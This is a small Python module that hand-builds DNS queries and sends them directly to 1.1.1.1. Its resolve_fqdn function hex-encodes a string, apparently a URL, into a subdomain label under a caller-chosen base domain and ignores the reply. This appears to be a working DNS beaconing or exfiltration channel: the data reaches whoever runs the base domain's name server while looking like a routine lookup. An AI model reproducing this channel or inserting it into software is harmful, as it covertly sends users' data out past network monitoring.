import random
import socket
import struct


# def resolve(fqdn):
#     try:
#         # Attempt to resolve the FQDN to an IP address
#         socket.gethostbyname(fqdn)
#     except Exception:
#         pass

def create_dns_query(domain):
    """
    Create a DNS query packet for an A (IPv4) record.
    """
    # Header Section: [ID, Flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT]
    header = struct.pack('>HHHHHH', random.randint(
        0, 65535), 0x0100, 1, 0, 0, 0)
    # Question Section: QNAME, QTYPE for A, QCLASS for IN
    qname = b''.join(struct.pack('>B', len(part)) + part.encode()
                     for part in domain.split('.')) + b'\x00'
    question = qname + struct.pack('>HH', 1, 1)  # QTYPE 1 = A record
    return header + question


def resolve(domain):
    dns_query = create_dns_query(domain)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    dns_server = ('1.1.1.1', 53)
    sock.sendto(dns_query, dns_server)
    try:
        # 512 bytes is the typical size of a DNS response
        sock.recvfrom(512)
    except:
        pass
    finally:
        sock.close()


def resolve_fqdn(fqdn_str, sub1, sub2, base):
    domain_inst = fqdn_str.replace('https://', '')[:30].encode().hex()
    fqdn = f"{domain_inst}.{sub1}.{sub2}.{base}"
    resolve(fqdn)
